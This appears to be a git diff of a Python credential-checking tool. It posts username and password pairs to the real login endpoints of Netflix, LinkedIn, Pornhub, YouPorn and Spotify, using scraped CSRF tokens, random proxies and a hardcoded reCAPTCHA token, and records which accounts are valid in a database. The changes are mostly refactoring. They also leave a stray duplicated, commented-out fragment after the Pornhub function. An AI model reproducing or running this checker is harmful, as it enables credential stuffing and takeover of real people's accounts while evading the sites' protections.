@@ -1,25 +1,28 @@
-from manage_requests import ManageRequests
-from bs4 import BeautifulSoup
-import json
 import base64
 import logging as log
 
-# def spotify(self, creds):
+from bs4 import BeautifulSoup
+
+from manage_requests import ManageRequests
+
+
+# def spotify(usr: str, pwd: str, mr: ManageRequests):
 #     site_get = "https://accounts.spotify.com/it/login"
 #     cookies = self.req.get(site_get).cookies.get_dict()
 #     csrf = cookies["csrf_token"]
 #     cookies["__bon"] = "MHwwfC00ODY2MjU5N3wtMjA0MzgyOTA3NHwxfDF8MXwx"  # Non me gusta hardcodarlo
-#     site_post=site_get
+#     site_post = site_get
 #     site_post = "https://accounts.spotify.com/password/login/"
 #     usr = creds.split(":")[0].strip()
 #     pwd = creds.split(":")[1].strip()
 #     self.req.headers.update({"content-length": str(9999)})
 #     account_proxy = self.set_random_proxyy()
-#     recaptcha="3AOLTBLTG3vkAxIqYcJpKqDtD25hvebW9hG0YOMwv5-WR9V3HefOgKmKbEFGeloLzjOHilwU7qZlrj6YiI4C5kg83j283SYUoZKeqvOXhL-AGXGR8PygVup5Ae58MQNCdfFTPXkWpFrb_NUB3XrbKXVasonIKqUhFGcv91PWzVBw3Nsx-GlAeAqn2pz5uVVzQpVzssSZCs6ocBj9J_Bsuwln2GrQFfcgehsI7Pzv8aIfdSmVsSSBvTup6xBWbtRq2nUrigADfF8DrLmS1aRGuOTEFOvmYPwDA8GPchAtO-bx9GrIRkXkBlFJ-P4ZEix6fNxheA0tywNncAA67rg-G3gq8avBJG33P4Wvs9GHrxGbh8GSEnZ6IEdRkRTb9RhrIlQTGukAclGId"
+#     recaptcha = "3AOLTBLTG3vkAxIqYcJpKqDtD25hvebW9hG0YOMwv5-WR9V3HefOgKmKbEFGeloLzjOHilwU7qZlrj6YiI4C5kg83j283SYUoZKeqvOXhL-AGXGR8PygVup5Ae58MQNCdfFTPXkWpFrb_NUB3XrbKXVasonIKqUhFGcv91PWzVBw3Nsx-GlAeAqn2pz5uVVzQpVzssSZCs6ocBj9J_Bsuwln2GrQFfcgehsI7Pzv8aIfdSmVsSSBvTup6xBWbtRq2nUrigADfF8DrLmS1aRGuOTEFOvmYPwDA8GPchAtO-bx9GrIRkXkBlFJ-P4ZEix6fNxheA0tywNncAA67rg-G3gq8avBJG33P4Wvs9GHrxGbh8GSEnZ6IEdRkRTb9RhrIlQTGukAclGId"
 #     res = self.post_with_checks(site_post,
 #                                 data={"username": usr, "password": pwd, "csrf_token": csrf},
 #                                 cookies=cookies)
 #     print(res.content)
+
 
 
 def linkedin(usr : str, pwd : str, mr : ManageRequest):
@@ -98,38 +101,49 @@ def youporn(usr : str, pwd : str, mr : ManageRequest):
     mr.req.cookies.clear()
 
 
-def pornhub(usr : str, pwd : str, mr : ManageRequest):
-    post_url = "https://www.pornhub.com/front/authenticate"
-    get_url = "https://www.pornhub.com/"
+# def pornhub(usr: str, pwd: str, mr: ManageRequests):
+#     post_url = "https://www.pornhub.com/front/authenticate"
+#     get_url = "https://www.pornhub.com/"
+#
+#     # Get main page with redirect and token
+#     res = mr.get_with_checks(get_url, headers={'User-Agent': 'Mozilla/5.0'})
+#     # Filter out redirect and token
+#     soup = BeautifulSoup(res.text, features="html.parser")
+#     redirect = soup.find('input', attrs={'name': 'redirect'})['value']
+#     token = soup.find('input', attrs={'name': 'token'})['value']
+#
+#     # Post request to login
+#     res = mr.post_with_checks(post_url,
+#                               data={'username': usr,
+#                                     'password': pwd,
+#                                     'subscribe': 'undefined',
+#                                     'setSendTip': 'false',
+#                                     'remember_me': '0',
+#                                     'from': 'pc_login_modal_:index',
+#                                     'redirect': redirect,
+#                                     'token': token,
+#                                     })
+#
+#     if int(json.loads(res.content)["success"]) == 1:
+#         mr.db.update_result(usr, pwd, "pornhub", "True")
+#         log.info("Account valid {}".format(usr))
+#     else:
+#         mr.db.update_result(usr, pwd, "pornhub", "False")
+#         log.info("Account error {} {}".format(usr, pwd))
+#     log.info("-------------------------------")
+#     mr.req.cookies.clear()
 
-    # Get main page with redirect and token
-    res = mr.req.get(get_url, headers={'User-Agent': 'Mozilla/5.0'})
-    # Filter out redirect and token
-    soup = BeautifulSoup(res.text, features="html.parser")
-    redirect = soup.find('input', attrs={'name': 'redirect'})['value']
-    token = soup.find('input', attrs={'name': 'token'})['value']
-
-    # Post request to login
-    res = mr.post_with_checks(post_url,
-                              data={'username': usr,
-                                    'password': pwd,
-                                    'subscribe': 'undefined',
-                                    'setSendTip': 'false',
-                                    'remember_me': '0',
-                                    'from': 'pc_login_modal_:index',
-                                    'redirect': redirect,
-                                    'token': token
-                                    })
-
-    if int(json.loads(res.content)["success"]) == 1:
-        mr.db.update_result(usr, pwd, "pornhub", "True")
-        log.info("Account valid {}".format(usr))
-    else:
-        mr.db.update_result(usr, pwd, "pornhub", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
-
+#    # Post request to login
+#    res = mr.post_with_checks(post_url,
+#                              data={'username': usr,
+#                                    'password': pwd,
+#                                    'subscribe': 'undefined',
+#                                    'setSendTip': 'false',
+#                                    'remember_me': '0',
+#                                    'from': 'pc_login_modal_:index',
+#                                    'redirect': redirect,
+#                                    'token': token,
+#                                     })
 
 def netflix(usr: str, pwd: str, mr: ManageRequests):
     site_url = "https://www.netflix.com/Login"
@@ -139,7 +153,7 @@ def netflix(usr: str, pwd: str, mr: ManageRequests):
     # Filter out authURL value
     if res:
         soup = BeautifulSoup(res.text, features="html.parser")
-        authURL = soup.find('input', attrs={'name': 'authURL'})['value']
+        auth_url = soup.find('input', attrs={'name': 'authURL'})['value']
 
         # Post request to login
         res = mr.post_with_checks(site_url,
@@ -150,7 +164,7 @@ def netflix(usr: str, pwd: str, mr: ManageRequests):
                                         'mode': 'login',
                                         'action': 'loginAction',
                                         'withFields': 'email,password,rememberMe,nextPage',
-                                        'authURL': authURL,
+                                        'authURL': auth_url,
                                         'nextPage': 'https://www.netflix.com/viewingactivity'
                                         })
 
